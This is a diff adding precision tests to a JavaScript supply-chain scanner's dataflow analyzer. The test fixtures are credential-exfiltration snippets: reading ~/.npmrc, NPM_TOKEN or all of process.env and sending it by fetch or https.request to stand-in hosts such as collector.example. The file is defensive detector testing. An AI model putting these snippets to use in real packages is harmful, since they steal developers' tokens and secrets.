@@ -1034,6 +1034,78 @@ fetch('https://checkmarx.zone/exfil', { method: 'POST', body: data });
       assert(t.severity === 'CRITICAL', `Expected CRITICAL, got ${t.severity}`);
     } finally { cleanupTemp(tmp); }
   });
+
+  // ── Precision fixes (2026-11): positional parameters, null-prototype tables,
+  // weak-source co-occurrence. Expected severities come from the spec in
+  // src/scanner/dataflow.js, asserted on the scanner's own finding.
+  const { analyzeDataFlow } = require('../../src/scanner/dataflow.js');
+  const dfFindings = async (js) => {
+    const tmp = makeTempPkg(js);
+    try { return (await analyzeDataFlow(tmp)).filter(t => t.type === 'suspicious_dataflow'); } finally { cleanupTemp(tmp); }
+  };
+
+  await asyncTest('DATAFLOW precision: a destructured first parameter does not shift taint off the real path argument', async () => {
+    const f = await dfFindings([
+      "const fs = require('fs');",
+      "const p = '/home/dev/.npmrc';",
+      // call before the (hoisted) declaration: the walk visits the call first,
+      // which is the order in which parameter taint is propagated
+      "const data = load({ encoding: 'utf8' }, p);",
+      "fetch('https://collector.example/c', { method: 'POST', body: data });",
+      'function load({ encoding }, file) { return fs.readFileSync(file, encoding); }'
+    ].join('\n'));
+    assert(f.length === 1, 'sensitive read through the second parameter must be followed: ' + JSON.stringify(f.map(x => x.message)));
+  });
+
+  await asyncTest('DATAFLOW precision: plain positional parameters still propagate (regression guard)', async () => {
+    const f = await dfFindings([
+      "const fs = require('fs');",
+      "const p = '/home/dev/.npmrc';",
+      'const data = load(p);',
+      "fetch('https://collector.example/c', { method: 'POST', body: data });",
+      'function load(file) { return fs.readFileSync(file, "utf8"); }'
+    ].join('\n'));
+    assert(f.length === 1, 'single-parameter propagation must keep working: ' + f.length);
+  });
+
+  await asyncTest('DATAFLOW precision: an inherited Object.prototype member is not a source method', async () => {
+    // os.toString is inherited, not an os source method; with a network call
+    // next to it the old lookup produced a bogus "credentials read" flow.
+    const f = await dfFindings("const os = require('os');\nconst v = os.toString();\nfetch('https://api.example/v1?v=' + v);");
+    assert(f.length === 0, 'inherited members must not count as sources: ' + JSON.stringify(f.map(x => x.message)));
+  });
+
+  await asyncTest('DATAFLOW precision: a real https.request sink still counts (regression guard)', async () => {
+    const f = await dfFindings([
+      'const token = process.env.NPM_TOKEN;',
+      "const https = require('https');",
+      "https.request({ host: 'collector.example', path: '/' + token }).end();"
+    ].join('\n'));
+    assert(f.length === 1 && (f[0].severity === 'HIGH' || f[0].severity === 'CRITICAL'), JSON.stringify(f.map(x => [x.severity, x.message])));
+  });
+
+  await asyncTest('DATAFLOW precision: named non-credential env + network is kept at MEDIUM', async () => {
+    const f = await dfFindings("const region = process.env.AWS_REGION;\nfetch('https://api.example/v1?r=' + region);");
+    assert(f.length === 1 && f[0].severity === 'MEDIUM', 'weak co-occurrence must be MEDIUM: ' + JSON.stringify(f.map(x => [x.severity, x.message])));
+  });
+
+  await asyncTest('DATAFLOW precision (adversarial): a dynamic process.env[key] harvest is never weak', async () => {
+    const f = await dfFindings("const out = {};\nfor (const k of Object.keys(process.env)) out[k] = process.env[k];\nfetch('https://collector.example/e', { method: 'POST', body: JSON.stringify(out) });");
+    assert(f.length >= 1 && f.every(x => x.severity === 'HIGH' || x.severity === 'CRITICAL'),
+      'env-harvesting loop must keep its severity: ' + JSON.stringify(f.map(x => [x.severity, x.message])));
+  });
+
+  await asyncTest('DATAFLOW precision (adversarial): identity env (HOME/USER) + network is never weak (beacon shape)', async () => {
+    // GT-018 mathjs-min shape: HOME + https.request in a Discord token grabber.
+    const f = await dfFindings("const https = require('https');\nconst who = process.env.USER + '@' + process.env.HOME;\nhttps.request({ host: 'collector.example', path: '/b?u=' + who }).end();");
+    assert(f.length >= 1 && f.every(x => x.severity === 'HIGH' || x.severity === 'CRITICAL'),
+      'identity beacon must keep its severity: ' + JSON.stringify(f.map(x => [x.severity, x.message])));
+  });
+
+  await asyncTest('DATAFLOW precision (adversarial): a weak env var does not dilute a credential source', async () => {
+    const f = await dfFindings("const region = process.env.AWS_REGION;\nconst t = process.env.NPM_TOKEN;\nfetch('https://collector.example/?r=' + region + '&t=' + t);");
+    assert(f.length === 1 && (f[0].severity === 'HIGH' || f[0].severity === 'CRITICAL'), JSON.stringify(f.map(x => [x.severity, x.message])));
+  });
 }
 
 module.exports = { runDataflowTests };
